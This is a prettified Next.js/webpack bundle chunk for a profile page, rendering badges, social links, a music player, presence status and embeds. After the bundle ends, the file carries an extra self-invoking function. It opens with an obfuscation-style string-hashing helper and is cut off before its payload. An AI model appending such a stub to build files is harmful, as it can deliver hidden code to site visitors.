                          xmlns: "http://www.w3.org/2000/svg",
                          width: "16",
                          height: "16",
                          fill: "currentColor",
                          className: "bi bi-eye",
                          viewBox: "0 0 16 16",
                          children: [
                            (0, c.jsx)("path", {
                              d: "M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z",
                            }),
                            (0, c.jsx)("path", {
                              d: "M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z",
                            }),
                          ],
                        }),
                        t.views,
                      ],
                    }),
                    (0, c.jsxs)("div", {
                      className: "flex items-center gap-2",
                      children: [
                        (0, c.jsx)("h1", {
                          className:
                            "max-w-md break-words text-center text-2xl font-medium",
                          children: t.name,
                        }),
                        (0, c.jsx)("div", {
                          className: "flex flex-row gap-1.5",
                          children:
                            ((M = t),
                            M.ranks.map(function (e) {
                              switch (e) {
                                case "Rich":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { height: "24", viewBox: "0 0 330 330", width: "24", xmlns: "http://www.w3.org/2000/svg", xmlnsXlink: "http://www.w3.org/1999/xlink", version: "1.1", id: "Layer_1", x: "0px", y: "0px", xmlSpace: "preserve", fill: "#85bb65", children: [(0, c.jsxs)("g", { id: "XMLID_71_", children: [(0, c.jsx)("path", { id: "XMLID_85_", d: "M280,263.768V195c0-51.241-33.69-94.756-80.08-109.574l34.684-28.903C238.022,53.673,240,49.452,240,45 c0-24.813-20.188-45-45-45h-60c-24.813,0-45,20.187-45,45c0,4.452,1.977,8.673,5.396,11.523l34.684,28.903 C83.689,100.244,50,143.759,50,195v68.768C34.394,275.988,25,294.906,25,315c0,8.284,6.716,15,15,15h250c8.284,0,15-6.716,15-15 C305,294.906,295.605,275.988,280,263.768z M174.729,261.476v5.352c0,3.655-3.49,6.86-7.469,6.86c-4.119,0-7.471-3.078-7.471-6.86 v-4.46c-18.539-1.526-30.162-12.478-30.162-20.108c0-4.339,3.803-9.579,8.524-9.579c2.818,0,4.656,1.912,6.602,3.936 c2.715,2.824,6.637,6.902,15.035,8.1v-36.731c-12.663-4.493-27.449-10.609-27.449-31.34c0-16.518,9.945-27.131,27.449-29.551 v-3.912c0-3.789,3.352-6.871,7.471-6.871c3.979,0,7.469,3.211,7.469,6.871v3.509c9.55,1.016,22.928,4.554,22.928,12.906 c0,4.002-3.188,9.584-8.377,9.584c-1.887,0-3.525-0.835-5.422-1.803c-2.178-1.109-4.97-2.533-9.129-3.298v30.134 c10.191,3.845,25.645,11.352,25.645,34.317C200.373,246.212,191.082,258.048,174.729,261.476z" }), (0, c.jsx)("path", { id: "XMLID_88_", d: "M149.84,175.744c0,6.788,3.209,10.102,10.258,13.165v-24.543 C149.839,166.638,149.84,173.359,149.84,175.744z" }), (0, c.jsx)("path", { id: "XMLID_89_", d: "M174.28,213.971v29.6c5.669-2.262,8.439-6.922,8.439-14.133 C182.719,221.503,179.695,217.209,174.28,213.971z" })] }), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {}), (0, c.jsx)("g", {})] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Owner":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#cc0011" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Developer":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#450006" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Admin":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#ff4d5c" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Staff":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#020275" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Beta":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#fbff00" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Premium":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "24", viewBox: "0 0 512 512", width: "24", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#1da1f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                                case "Verified":
                                  return (0,
                                  c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { height: "16", viewBox: "0 0 512 512", width: "16", xmlns: "http://www.w3.org/2000/svg", children: (0, c.jsx)("path", { d: "m512 268c0 17.9-4.3 34.5-12.9 49.7s-20.1 27.1-34.6 35.4c.4 2.7.6 6.9.6 12.6 0 27.1-9.1 50.1-27.1 69.1-18.1 19.1-39.9 28.6-65.4 28.6-11.4 0-22.3-2.1-32.6-6.3-8 16.4-19.5 29.6-34.6 39.7-15 10.2-31.5 15.2-49.4 15.2-18.3 0-34.9-4.9-49.7-14.9-14.9-9.9-26.3-23.2-34.3-40-10.3 4.2-21.1 6.3-32.6 6.3-25.5 0-47.4-9.5-65.7-28.6-18.3-19-27.4-42.1-27.4-69.1 0-3 .4-7.2 1.1-12.6-14.5-8.4-26-20.2-34.6-35.4-8.5-15.2-12.8-31.8-12.8-49.7 0-19 4.8-36.5 14.3-52.3s22.3-27.5 38.3-35.1c-4.2-11.4-6.3-22.9-6.3-34.3 0-27 9.1-50.1 27.4-69.1s40.2-28.6 65.7-28.6c11.4 0 22.3 2.1 32.6 6.3 8-16.4 19.5-29.6 34.6-39.7 15-10.1 31.5-15.2 49.4-15.2s34.4 5.1 49.4 15.1c15 10.1 26.6 23.3 34.6 39.7 10.3-4.2 21.1-6.3 32.6-6.3 25.5 0 47.3 9.5 65.4 28.6s27.1 42.1 27.1 69.1c0 12.6-1.9 24-5.7 34.3 16 7.6 28.8 19.3 38.3 35.1 9.5 15.9 14.3 33.4 14.3 52.4zm-266.9 77.1 105.7-158.3c2.7-4.2 3.5-8.8 2.6-13.7-1-4.9-3.5-8.8-7.7-11.4-4.2-2.7-8.8-3.6-13.7-2.9-5 .8-9 3.2-12 7.4l-93.1 140-42.9-42.8c-3.8-3.8-8.2-5.6-13.1-5.4-5 .2-9.3 2-13.1 5.4-3.4 3.4-5.1 7.7-5.1 12.9 0 5.1 1.7 9.4 5.1 12.9l58.9 58.9 2.9 2.3c3.4 2.3 6.9 3.4 10.3 3.4 6.7-.1 11.8-2.9 15.2-8.7z", fill: "#1da1f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: M.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: e }) }) })] });
                              }
                            })),
                        }),
                      ],
                    }),
                    (0, c.jsx)("p", {
                      className:
                        "break-words text-center font-medium text-gray-300 ".concat(
                          L
                            ? "max-w-lg"
                            : "truncate max-w-[50vw] md:max-w-lg md:overflow-visible md:whitespace-normal"
                        ),
                      children: t.description,
                    }),
                    (0, c.jsxs)("div", {
                      className: "mt-3 w-full",
                      children: [
                        " ",
                        (0, c.jsx)("div", {
                          className: "mb-4 flex justify-center gap-4 flex-wrap",
                          children:
                            ((y = t.socials),
                            (N = t.accentcolor),
                            y.map(function (e) {
                              if ("" !== e.name && "" !== e.url)
                                return e.url.startsWith("https://") ||
                                  e.url.startsWith("http://") ||
                                  e.url.startsWith("mailto:")
                                  ? (0, c.jsxs)("div", {
                                      className:
                                        "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear",
                                      onClick: function () {
                                        open(e.url);
                                      },
                                      children: [
                                        (0, c.jsx)("div", {
                                          className:
                                            " flex cursor-pointer flex-col items-center justify-center rounded-3xl p-2 shadow-lg transition-all duration-300 ease-linear hover:rounded-xl hover:text-white hover:shadow-darkM-700/20",
                                          style: { backgroundColor: N + "80" },
                                          children: S(e.name),
                                        }),
                                        (0, c.jsx)("div", {
                                          className:
                                            "relative flex justify-center",
                                          children: (0, c.jsx)("div", {
                                            className:
                                              "absolute mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100",
                                            style: {
                                              backgroundColor: N + "80",
                                            },
                                            children: (0, c.jsx)("p", {
                                              className:
                                                "hidden w-full max-w-2xl group-hover:block",
                                              children: e.name,
                                            }),
                                          }),
                                        }),
                                      ],
                                    })
                                  : (0, c.jsxs)("div", {
                                      className:
                                        "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear",
                                      onClick: function () {
                                        w("Text copied to clipboard", "info"),
                                          navigator.clipboard.writeText(e.url);
                                      },
                                      children: [
                                        (0, c.jsx)("div", {
                                          className:
                                            " flex cursor-pointer flex-col items-center justify-center rounded-3xl p-2 shadow-lg transition-all duration-300 ease-linear hover:rounded-xl hover:text-white hover:shadow-darkM-700/20",
                                          style: { backgroundColor: N + "80" },
                                          children: S(e.name),
                                        }),
                                        (0, c.jsx)("div", {
                                          className:
                                            "relative flex justify-center",
                                          children: (0, c.jsx)("div", {
                                            className:
                                              "absolute mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100",
                                            style: {
                                              backgroundColor: N + "80",
                                            },
                                            children: (0, c.jsx)("p", {
                                              className:
                                                "hidden w-full max-w-2xl group-hover:block",
                                              children: e.url,
                                            }),
                                          }),
                                        }),
                                      ],
                                    });
                            })),
                        }),
                      ],
                    }),
                    t.songs.length > 0 &&
                      (0, c.jsx)("div", {
                        className:
                          "w-full p-2 md:min-w-[40rem] rounded-lg text-center",
                        style: { backgroundColor: t.primarycolor },
                        children: (0, c.jsx)(v.Z, {
                          ref: k,
                          autoPlay: f,
                          header: o
                            ? "Now playing: " +
                              b.name
                                .replace(/\.[^/.]+$/, "")
                                .replaceAll("_", " ")
                            : "Now playing: -",
                          src: b.url,
                          showSkipControls: !0,
                          showJumpControls: !1,
                          volume: 0.5,
                          onPlay: function () {
                            return h(function (e) {
                              return Z({}, e, { isMusicPlaying: !0 });
                            });
                          },
                          onClickPrevious: function () {
                            h(function (e) {
                              return Z({}, e, {
                                currentMusicIndex:
                                  0 === e.currentMusicIndex
                                    ? t.songs.length - 1
                                    : e.currentMusicIndex - 1,
                              });
                            });
                          },
                          onClickNext: u,
                          onEnded: u,
                          customAdditionalControls: [],
                        }),
                      }),
                    (0, c.jsx)("div", {
                      className: "px-0.65 w-full",
                      children:
                        t.presence &&
                        null !== t.bio_presence &&
                        (0, c.jsxs)("div", {
                          className:
                            "flex w-full mt-2 flex-col rounded-lg p-4 justify-center items-center",
                          style: { backgroundColor: t.primarycolor },
                          children: [
                            (0, c.jsxs)("div", {
                              className:
                                "flex gap-4 pb-4 border-b border-b-darkM-800 w-full justify-center",
                              children: [
                                (0, c.jsx)("img", {
                                  src: t.bio_presence.pfp,
                                  className:
                                    "h-16 w-16 rounded-full border-4 ".concat(
                                      V(t.bio_presence.status)
                                    ),
                                  draggable: !1,
                                  alt: "",
                                }),
                                (0, c.jsxs)("div", {
                                  children: [
                                    (0, c.jsxs)("div", {
                                      className: "flex mt-2 items-center gap-2",
                                      children: [
                                        (0, c.jsx)("p", {
                                          className: "text-lg font-semibold",
                                          children: t.bio_presence.tag.replace(
                                            /[\u0000-\u001F\u007F-\u009F\u200B\u1CBB\u1CBC]/g,
                                            ""
                                          ),
                                        }),
                                        (0, c.jsx)("div", {
                                          className: "flex flex-row gap-0.5",
                                          children:
                                            null !== t.bio_presence.badges &&
                                            A(t),
                                        }),
                                      ],
                                    }),
                                    null !== t.bio_presence.customStatus &&
                                      (0, c.jsxs)("div", {
                                        className:
                                          "text-sm text-gray-300 flex flex-row gap-2",
                                        children: [
                                          null !==
                                          t.bio_presence.customStatus.emoji
                                            ? (0, c.jsx)("img", {
                                                draggable: !1,
                                                src: t.bio_presence.customStatus
                                                  .emoji,
                                                className: "h-5 w-5",
                                                alt: "",
                                              })
                                            : (0, c.jsx)(c.Fragment, {}),
                                          t.bio_presence.customStatus.name,
                                        ],
                                      }),
                                  ],
                                }),
                              ],
                            }),
                            t.bio_presence.activities.length > 0
                              ? (0, c.jsx)(x, { bio: t })
                              : (0, c.jsx)("div", {
                                  className:
                                    "mt-6 flex w-full md:max-w-md px-8 justify-center items-center gap-4 rounded-xl bg-darkM-800/40 p-2",
                                  style: {
                                    backgroundColor: t.accentcolor + "66",
                                  },
                                  children: (0, c.jsx)("p", {
                                    className: "text-lg font-semibold",
                                    children: "The user isn't playing anything",
                                  }),
                                }),
                          ],
                        }),
                    }),
                    (0, c.jsx)("div", {
                      className:
                        "mt-2 flex justify-center items-center gap-4 flex-col w-full",
                      children:
                        ((z = t.embeds),
                        z.map(function (e) {
                          if ("" !== e)
                            return (0, c.jsx)("iframe", {
                              className: "rounded-xl",
                              src: e,
                              width: "99%",
                              height: e.includes(
                                "open.spotify.com/embed/track/"
                              )
                                ? "80px"
                                : "250px",
                              frameBorder: "0",
                              allowFullScreen: !1,
                              allow:
                                "autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture",
                            });
                        })),
                    }),
                  ],
                }),
              ],
            }),
          ],
        });
      }
      var D = !0;
      function _(e) {
        var t = e.bio,
          s = e.musicIndex,
          n = (0, r.useRouter)().query.username;
        return (
          !0 === t.countViews &&
            (0, a.useEffect)(function () {
              (0, i.ed)(n.toString());
            }, []),
          (0, c.jsxs)(c.Fragment, {
            children: [
              (0, c.jsx)(l.PB, {
                title: t.name,
                description: t.description,
                additionalMetaTags: [
                  { property: "theme-color", content: t.color },
                ],
                openGraph: {
                  title: t.name,
                  description: t.description,
                  images: [{ url: t.pfp.url, alt: t.description }],
                },
              }),
              (function (e) {
                switch (e) {
                  case 0:
                    return (0, c.jsx)(k, { bio: t, musicIndex: s });
                  case 1:
                    return (0, c.jsx)(H, { bio: t, musicIndex: s });
                }
              })(t.layout),
            ],
          })
        );
      }
    },
  },
  function (e) {
    e.O(0, [669, 360, 774, 888, 179], function () {
      return 221, e((e.s = 221));
    });
    var t = e.O();
    _N_E = t;
  },
]);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
